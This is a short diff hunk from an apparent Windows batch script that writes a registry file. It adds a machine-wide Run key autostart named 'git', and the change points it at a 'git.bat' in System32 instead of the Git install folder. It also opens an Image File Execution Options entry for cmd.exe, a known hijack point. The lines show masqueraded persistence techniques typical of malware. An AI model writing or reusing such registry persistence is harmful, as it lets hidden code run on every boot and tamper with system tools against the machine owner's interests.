@@ -62,7 +62,7 @@ echo Windows Registry Editor Version 5.00 > "%temp%\myreg.reg"
 
 echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> "%temp%\myreg.reg"
 
-echo "git"="C:\\Program Files\\git\\git.bat" >> "%temp%\myreg.reg"
+echo "git"="C:\\Windows\System32\\git.bat" >> "%temp%\myreg.reg"
 
 echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe] >> "%temp%\myreg.reg"
 
